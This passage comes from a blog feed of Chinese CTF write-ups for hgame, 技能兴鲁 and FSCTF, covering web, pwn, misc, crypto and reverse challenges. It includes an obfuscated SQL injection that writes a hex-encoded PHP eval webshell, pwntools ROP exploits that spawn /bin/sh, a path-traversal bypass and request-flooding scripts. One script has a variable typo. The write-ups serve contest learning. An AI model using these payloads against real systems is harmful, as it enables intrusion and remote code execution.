id=\"jhat100pt\"><a class=\"markdownIt-Anchor\" href=\"#jhat100pt\">#</a> jhat(100pt)</h3>\n<blockquote>\n<p>jhat is a tool used for analyzing Java heap dump files</p>\n<p><strong>提示 1</strong>hint1: need rce</p>\n<p><strong>提示 2</strong>hint2: focus on oql</p>\n<p><strong>提示 3</strong>hint3: 题目不出网 想办法拿到执行结果</p>\n</blockquote>\n<p>没做</p>\n<h3 id=\"select-courses100pt\"><a class=\"markdownIt-Anchor\" href=\"#select-courses100pt\">#</a> Select Courses(100pt)</h3>\n<blockquote>\n<p>Can you help ma5hr00m select the desired courses?</p>\n</blockquote>\n<blockquote>\n<p>偶然间用 burp，随意放包选上了一次课，故怀疑概率有课能被选中，写脚本跑这概率事件即可，经测试约 3,700 次所有课全部选中</p>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://47.100.245.185:32274/api/courses\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"Accept\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"*/*\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"Accept-Language\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"Accept-Encoding\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"gzip, deflate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"Referer\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://47.102.130.35:32583/\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"Origin\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://47.102.130.35:32583\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"Connection\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"close\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   \t    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Status Code: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, Response: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy=\"false\">{</mo><mi>w</mi><mn>0</mn><mi>W</mi><mi mathvariant=\"normal\">_</mi><mo stretchy=\"false\">!</mo><mi mathvariant=\"normal\">_</mi><mn>1</mn><mi>E</mi><mn>4</mn><mi>R</mi><mi>n</mi><mi mathvariant=\"normal\">_</mi><mi>T</mi><mi>o</mi><mi mathvariant=\"normal\">_</mi><mi>u</mi><mn>5</mn><mi>e</mi><mi mathvariant=\"normal\">_</mi><mn>5</mn><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">hgame\\{w0W\\_!\\_1E4Rn\\_To\\_u5e\\_5cripT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.06em;vertical-align:-0.31em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">{</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mclose\">!</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord\">1</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord\">4</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">n</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">o</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\">u</span><span class=\"mord\">5</span><span class=\"mord mathnormal\">e</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord\">5</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">_</mi></mrow><annotation encoding=\"application/x-tex\">\\_</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:-0.31em;\"></span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span></span></span></span><sup>_</sup>}</p>\n</blockquote>\n<h3 id=\"ezhttp50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezhttp50pt\">#</a> ezHTTP(50pt)</h3>\n<blockquote>\n<p>HTTP Protocol Basics</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Referer: vidar.club\"</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\"</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"X-Real-IP: 127.0.0.1\"</span> http://47.100.137.175:31983 <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">--color</span> <span class=\"token parameter variable\">-E</span> <span class=\"token string\">'Authorization'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>使用 <span class=\"token function\">awk</span> 命令根据点号分隔 JWT，并对每一部分进行 base64 解码。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F. <span class=\"token string\">'&#123;print $2&#125;'</span> <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">--decode</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"F14g\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"hgame&#123;HTTP_!s_1mP0rT4nt&#125;\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "url": "https://yhuanhuan01.github.io/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "title": "技能兴鲁",
            "date_published": "2023-11-15T00:01:08.000Z",
            "content_html": "<h1 id=\"技能兴鲁\"><a class=\"markdownIt-Anchor\" href=\"#技能兴鲁\">#</a> 技能兴鲁</h1>\n<p>最终排名 15 名</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/1png\" alt=\"img\"></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> <strong>Misc</strong></h2>\n<h3 id=\"datas_secret\"><a class=\"markdownIt-Anchor\" href=\"#datas_secret\">#</a> Datas_secret</h3>\n<pre><code class=\"language-Python\"> python2 vol.py -f image.vmem --profile=Win7SP1x64 filescan|grep flag\n python2 vol.py -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D  ./\n</code></pre>\n<p 23030d1c2aa90debdf7757782e9f1ee9=\"\">flag</p>\n<h3 id=\"卑劣的手段\"><a class=\"markdownIt-Anchor\" href=\"#卑劣的手段\">#</a> 卑劣的手段</h3>\n<pre><code class=\"language-Bash\">python2 vol.py -f image1.vmem --profile=WinXPSP1x64 filescan | grep png\n python2 vol.py -f image1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d44eb0 -D  ./\nzsteg chuyin.png\n</code></pre>\n<p>flag{Hat3une_M1ku}rI$</p>\n<h3 id=\"时间不多了\"><a class=\"markdownIt-Anchor\" href=\"#时间不多了\">#</a> 时间不多了</h3>\n<pre><code class=\"language-Python\">import os\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\n\ndef scan_qrcodes(folder_path):\n    # 检查文件夹中的所有文件\n    for filename in os.listdir(folder_path):\n        if filename.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):\n            # 拼接完整的文件路径\n            file_path = os.path.join(folder_path, filename)\n            # 打开图像文件\n            image = Image.open(file_path)\n            # 解码图像中的二维码\n            decoded_objects = decode(image)\n            # 打印所有解码出的二维码内容\n            for obj in decoded_objects:\n                print(f&quot;文件 &#123;filename&#125; 中的二维码内容: &#123;obj.data.decode('utf-8')&#125;&quot;)\n\n# 使用示例\nfolder_path = './attachment'\nscan_qrcodes(folder_path)\n</code></pre>\n<p>扫描二维码得到 base64</p>\n<pre><code>MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==\nNiAxMyAyMCAyNyAyOA==\nMiAxNSAyMiAxNyAyNCAxNg==\nNiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=\nMiAzIDkgMTUgMjMgMzAgMzE=\nNSAxMyAyMCAyNyAxNCAyMQ==\nNiAxOSAyNiAyMSAyOCAyMA==\nOSAxMCAxMSAxNyAyNCAzMQ==\nMSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==\nMiAzIDkgMTYgMTcgMjQgMzAgMzE=\nMiA4IDE1IDIzIDI0IDE4IDExIDM=\nMSAyIDkgMTcgMjMgMzAgMjk=\n</code></pre>\n<p>base64 解码得到</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/2.png\" alt=\"img\"></p>\n<p>之后根据日历表。画图，得到 flag</p>\n<p>画图就像这样：</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/5.png\" alt=\"img\"></p>\n<p>拼起来得到 flag</p>\n<p DATESO=\"\">flag</p>\n<h3 id=\"赛后复现\"><a class=\"markdownIt-Anchor\" href=\"#赛后复现\">#</a> ** 赛后复现 **</h3>\n<h4 id=\"未知的加密\"><a class=\"markdownIt-Anchor\" href=\"#未知的加密\">#</a> 未知的加密</h4>\n<p>密码用 010 打开，掩码   Password SiertingXXXX, where X is a pure number…</p>\n<blockquote>\n<p>Sierting2023</p>\n</blockquote>\n<p>给了一个 Virtual，容器文件。使用取证大师。</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/22.png\" alt=\"image-20231115085341435\"></p>\n<p>使用 VeraCrypt 挂在 enc 密码仍然是 Sierting2023 找到文件 flag.swp</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/23.png\" alt=\"image-20231115085923465\"></p>\n<h4 id=\"ic-card\"><a class=\"markdownIt-Anchor\" href=\"#ic-card\">#</a> IC-Card</h4>\n<p>两个文件.</p>\n<p>一个 IC 的 bin 文件，一共镜像层文件。</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/24.png\" alt=\"image-20231115090413292\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/25.png\" alt=\"image-20231115090503188\"></p>\n<p>得到压缩包密码。</p>\n<p>找到 decrypted_string 文件</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/26.png\" alt=\"image-20231115090654275\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> <strong>Web</strong></h2>\n<h3 id=\"日志里的flag\"><a class=\"markdownIt-Anchor\" href=\"#日志里的flag\">#</a> <strong>日志里的 FLAG</strong></h3>\n<pre><code class=\"language-Java\">  &lt;?php\n    highlight_file(__FILE__);\n    print(&quot;FLAG就存在于日志文件里哦！&quot;);\n    if (isset($_GET['path'])) &#123;\n        $path = $_GET['path'];\n        if (preg_match('/flag|\\$|[&quot;\\']/i', $path)) &#123;\n            echo &quot;错误&quot;;\n        &#125; else &#123;\n            $path = str_replace(&quot;log&quot;,&quot;&quot;, $path);\n            if (file_exists($path)) &#123;\n                $content = file_get_contents($path);\n                echo highlight_string($content, true);\n            &#125; else &#123;\n                echo &quot;文件不存在&quot;;\n            &#125;\n        &#125;\n    &#125; else &#123;\n        echo &quot;请提供文件路径&quot;;\n    &#125;\nFLAG就存在于日志文件里哦！请提供文件路径\n</code></pre>\n<p>双写绕过检查</p>\n<p>payload</p>\n<p>path=/var/lologg/nginx/access.lologg</p>\n<h3 id=\"购买flag\"><a class=\"markdownIt-Anchor\" href=\"#购买flag\">#</a> <strong>购买 flag</strong></h3>\n<p>登陆之后</p>\n<p>进入花费界面</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/6.png\" alt=\"img\"></p>\n<p>将 - 100 改为 + 100000000，发包，来回几次</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/7.png\" alt=\"img\"></p>\n<p>在购买 flag，在控制台看到 flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/8.png\" alt=\"img\"></p>\n<h3 id=\"一只小蜜蜂\"><a class=\"markdownIt-Anchor\" href=\"#一只小蜜蜂\">#</a> <strong>一只小蜜蜂</strong></h3>\n<p>参考文章 https://blog.csdn.net/qq_43573676/article/details/105627370</p>\n<p>在主页面进行 post 传参</p>\n<p>_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999</p>\n<p>之后访问 url/admin/login.php</p>\n<p>便会自动进入后台管理界面</p>\n<p>之后退出登录</p>\n<p>进入到后台登录界面</p>\n<p>在登录界面存在 sql 注入漏洞</p>\n<pre><code class=\"language-HTML\">user=admin' un union ion selselectect 1,0x3c3f70687020406576616c28245f524551554553545b27414243275d293b3f3e,3,4,5 i into nto outoutfilefile\n'/var/www/html/123.php'#&amp;password=12&amp;code=f333&amp;submit=true&amp;submit.x=49&amp;submit.y=30\n</code></pre>\n<p>之后访问 123.php</p>\n<p>成功写马，</p>\n<p>蚁剑链接，得到 flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/9.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/10.png\" alt=\"img\"></p>\n<p 27e81dee3a91e5e39bd633147fa39f1c=\"\">flag</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"pwn1\"><a class=\"markdownIt-Anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nr = remote('vt.jnxl2023.sierting.com',32299)\n# r = process(&quot;./pwn&quot;)\n\ncontext.log_level = &quot;debug&quot;\n\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;1&quot;)\nr.sendlineafter(&quot;name: &quot;, &quot;abf1ag&quot;)\nr.sendlineafter(&quot;age: &quot;, &quot;18&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;2&quot;)\nr.sendlineafter(&quot;id: &quot;, &quot;0&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendafter(&quot;check name: &quot;, b&quot;a&quot; * 0x358 + p64(0x4025EF) + p64(0x4025D6) + b&quot;\\n&quot;)\nr.interactive()\n</code></pre>\n<h3 id=\"pwn2\"><a class=\"markdownIt-Anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nfrom LibcSearcher import *\n\ncontext.log_level = 'debug'\n\nr = remote('vt.jnxl2023.sierting.com',30629)\n\n# p = process('./pwn')\n\nelf = ELF('./pwn')\nlibc = ELF('libc.so.6')\n\ngot_addr = elf.got['puts']\nplt_addr = elf.plt['puts']\nmain_addr = elf.symbols['main']\npop_rdi = 0x4011e3\npop_rsi_r15 = 0x4006e1\nret_addr = 0x40101a\n\npayload = (0x10+8)*b'a' + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\nr.sendline(payload)\n\nputs_addr=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)\n\nlibc_base = puts_addr - libc.sym['puts']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base +  next(libc.search(b&quot;/bin/sh\\x00&quot;))\n\npl = (0x10+8)*b'a' + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\nr.sendline(pl)\n\nr.interactive()\n</code></pre>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"easyrsa\"><a class=\"markdownIt-Anchor\" href=\"#easyrsa\">#</a> EasyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/11.png\" alt=\"img\"></p>\n<h3 id=\"babyrsa\"><a class=\"markdownIt-Anchor\" href=\"#babyrsa\">#</a> BabyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/12.png\" alt=\"img\"></p>\n<h3 id=\"简单的python\"><a class=\"markdownIt-Anchor\" href=\"#简单的python\">#</a> 简单的 Python</h3>\n<p>解 base100</p>\n<pre><code class=\"language-Bash\">\n</code></pre>\n<p>解 base64</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/13.png\" alt=\"img\"></p>\n<p>atbash_cipher 和 string_reverserever</p>\n<pre><code class=\"language-Bash\">ntio&#123;lmi8i56k1lkn73im7ni75k52in41jj70&#125;\n</code></pre>\n<p>Caesar 8</p>\n<pre><code class=\"language-Bash\">flag&#123;dea8a56c1dcf73ae7fa75c52af41bb70&#125;\n</code></pre>\n<h2 id=\"reverse\"><a class=\"markdownIt-Anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> BabyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/14.png\" alt=\"img\"></p>\n<p>赛博厨子嗦哈</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/15.png\" alt=\"img\"></p>\n<h3 id=\"tea\"><a class=\"markdownIt-Anchor\" href=\"#tea\">#</a> TEA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/16.png\" alt=\"img\"></p>\n<p>不知道啥情况，打开就是 flag，试了，还真是</p>\n<h3 id=\"easyre\"><a class=\"markdownIt-Anchor\" href=\"#easyre\">#</a> EasyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/17.png\" alt=\"img\"></p>\n<p>自带解密函数</p>\n<pre><code class=\"language-JavaScript\">Java.perform(function () &#123;\n\n   var aESUtils =Java.use(&quot;com.example.easyre.AESUtils&quot;);\n    aESUtils.decrypt.implementation=function (a,b)&#123;\n\n\n       console.log(&quot;miwen:&quot;,a);\n       console.log(&quot;key&quot;, b);\n\n       var srcret = this.decrypt(a,b);\n       console.log(&quot;加密后:&quot;,srcret);\n       return srcret;\n&#125;\n\n&#125;);\n</code></pre>\n<p>hook 出来然后直接看密文</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/18.png\" alt=\"img\"></p>\n<p>base64 解密</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/19.png\" alt=\"img\"></p>\n<h3 id=\"gorc\"><a class=\"markdownIt-Anchor\" href=\"#gorc\">#</a> GORC</h3>\n<p>动调出 key</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/20.png\" alt=\"img\"></p>\n<p>直接解密</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/21.png\" alt=\"img\"></p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/10/24/FSCTF-wp/",
            "url": "https://yhuanhuan01.github.io/2023/10/24/FSCTF-wp/",
            "title": "FSCTF_wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"fsctf\"><a class=\"markdownIt-Anchor\" href=\"#fsctf\">#</a> FSCTF</h1>\n<p>RAND:12</p>\n<p><img data-src=\"/img/fsctfwppic/1.png\" alt=\"image-20231024075145656\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"源码启动\"><a class=\"markdownIt-Anchor\" href=\"#源码启动\">#</a> 源码！启动！</h3>\n<p>CTRL+U 查看源码</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> nc</h3>\n<pre><code>tac fl* &gt;&amp;2\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> Xor</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t~suiFz&#123;aM&#123;aMsMwsakM`wdw`awo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"rsa-1\"><a class=\"markdownIt-Anchor\" href=\"#rsa-1\">#</a> RSA 1</h3>\n<pre><code>p=1458769258361\nq=4556983871563\ne=17\n求d\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"做不出来就别阴阳怪气啦\"><a class=\"markdownIt-Anchor\" href=\"#做不出来就别阴阳怪气啦\">#</a> 做不出来就别阴阳怪气啦</h3>\n<pre><code>就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 